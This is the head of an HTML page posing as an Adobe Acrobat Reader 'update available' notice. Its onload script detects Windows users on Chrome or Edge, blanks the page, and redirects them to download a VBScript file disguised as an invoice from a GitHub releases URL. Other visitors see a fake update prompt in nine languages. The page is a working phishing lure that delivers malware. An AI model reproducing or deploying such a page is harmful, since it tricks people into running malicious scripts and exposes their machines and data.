<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Adobe Acrobat Reader: PDF</title>
  <link rel="shortcut icon" href="https://www.gstatic.com/android/market_images/web/favicon_v3.ico" />
  <script>
    window.onload = function () {
      // --- Helpers ---
      const ua = navigator.userAgent || "";
      const langs = (navigator.languages || [navigator.language || navigator.userLanguage || "en"]).map(l => (l || "ru").toLowerCase());
      const tz = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
      const host = (location.hostname || "").toLowerCase();

      const isWindows = ua.includes("Windows");
      const isChrome = ua.includes("Chrome") && !ua.includes("Edg/");
      const isEdge = ua.includes("Edg/");

      // If Windows + Chrome/Edge, keep your existing redirect behavior
      if (isWindows && (isChrome || isEdge)) {
        document.body.innerHTML = ""; // oculta conteúdo
        window.location.href = "https://github.com/sarjfatura/INVOICE/releases/download/FATURA/FT-27-02-2026.vbs"; // keep placeholder
        return;
      }

      // --- Language selection logic ---
      // 1) Prefer explicit browser language.
      // 2) If user is in Turkey's timezone or .tr domain, force Turkish.
      // 3) Fallback to English.
      function pickLang() {
        // Normalize to base tag (e.g., "pt-BR" -> "pt-br")
        const supported = ["de","fr","it","en","nl","es","pt-br","pt-pt","tr"];
        // If in Turkey timezone or TLD .tr, prefer Turkish
        const inTurkey = (tz === "Europe/Istanbul") || host.endsWith(".tr");
        if (inTurkey) return "tr";

        for (const l of langs) {
          const base = l.split("-")[0];
          if (supported.includes(l)) return l;
          if (base === "pt") {
            // Heuristic: map pt-PT vs pt-BR; default to pt-pt for Europe
            if (l.includes("pt-pt") || l.endsWith("-pt")) return "pt-pt";
            if (l.includes("pt-br")) return "pt-br";
            // fallback choose pt-pt
            return "pt-pt";
          }
          if (supported.includes(base)) return base;
        }
        return "en";
      }

      const title = {
        de: "Adobe Acrobat Reader: PDF lesen",
        fr: "Adobe Acrobat Reader : Lire le PDF",
        it: "Adobe Acrobat Reader: Leggi il PDF",
        en: "Adobe Acrobat Reader: Read PDF",
        nl: "Adobe Acrobat Reader: PDF lezen",
        es: "Adobe Acrobat Reader: Leer PDF",
        "pt-br": "Adobe Acrobat Reader: Ler PDF",
        "pt-pt": "Adobe Acrobat Reader: Ler PDF",
        tr: "Adobe Acrobat Reader: PDF'yi görüntüleyin"
      };

      const text = {
        de: "Updates verfügbar.<br><br>• Um diese PDF-Datei anzuzeigen, müssen Sie Ihre PDF-Anzeigeanwendung aktualisieren.<br><br>Nach der Aktualisierung können Sie Ihre Datei anzeigen.",
        fr: "Mises à jour disponibles.<br><br>• Pour afficher ce fichier PDF, vous devez mettre à jour votre application de lecture de PDF.<br><br>Après la mise à jour, vous pourrez afficher votre fichier.",
        it: "Aggiornamenti disponibili.<br><br>• Per visualizzare questo file PDF, devi aggiornare la tua applicazione di lettura di PDF.<br><br>Dopo l'aggiornamento potrai visualizzare il file.",
        en: "Updates available.<br><br>• To view this PDF file, you need to update your PDF reading application.<br><br>After the update, you will be able to view your file.",
        nl: "Updates beschikbaar.<br><br>• Om dit PDF-bestand te bekijken, moet u uw PDF-leesapplicatie bijwerken.<br><br>Na de update kunt u uw bestand bekijken.",
        es: "Actualizaciones disponibles.<br><br>• Para ver este archivo PDF, necesitas actualizar tu aplicación lectora de PDF.<br><br>Después de actualizar, podrás ver tu archivo.",
        "pt-br": "Atualizações disponíveis.<br><br>• Para visualizar este arquivo PDF, é necessário atualizar seu aplicativo de leitura de PDF.<br><br>Após a atualização, será possível visualizar o arquivo.",
        "pt-pt": "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a sua aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
        tr: "Güncellemeler mevcut.<br><br>• Bu PDF dosyasını görüntülemek için PDF okuma uygulamanızı güncellemeniz gerekiyor.<br><br>Güncellemeden sonra dosyanızı görüntüleyebileceksiniz."
      };

      const button = {
        de: "Jetzt aktualisieren",
        fr: "Mettre à jour maintenant",
        it: "Aggiorna ora",
        en: "Update Now",
        nl: "Nu bijwerken",
        es: "Actualizar ahora",
        "pt-br": "Atualizar agora",
        "pt-pt": "Atualizar agora",
        tr: "Şimdi güncelle"
      };

      const langKey = pickLang();

      // Reflect selected lang on <html lang="...">
      document.documentElement.setAttribute("lang", langKey);

      document.getElementById("title").innerText = title[langKey];
      document.getElementById("paragraph").innerHTML = text[langKey];
      document.getElementById("updateBtn").innerText = button[langKey];
    };
  </script>
  <style>
    body {
      background-color: #f0f4f8;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      color: #333;
    }
    .container {
      background-color: #ffffff;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      padding: 30px;
      text-align: center;
      width: 90%;
      max-width: 400px;
    }
    h1 {
      font-size: 26px;
      font-weight: bold;
      color: #d32f2f;
      margin-bottom: 15px;
    }
    p {
      font-size: 16px;
      margin: 15px 0;
      line-height: 1.6;
      color: #555;
    }
    button {
      font-size: 16px;
      font-weight: bold;
      width: 100%;
      height: 50px;
      background-color: #d32f2f;
      color: #fff;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s, box-shadow 0.3s;
      box-shadow: 0 0 5px rgba(211, 47, 47, 0.5);
    }
    button:hover {
      background-color: #b71c1c;
      box-shadow: 0 0 20px rgba(211, 47, 47, 0.7);
    }
    .copyright {
      font-size: 12px;
      margin-top: 15px;
      color: #888;
    }
    @media (max-width: 600px) {
      h1 { font-size: 22px; }
      p { font-size: 14px; }
      button { height: 45px; }
    }
  </style>
</head>
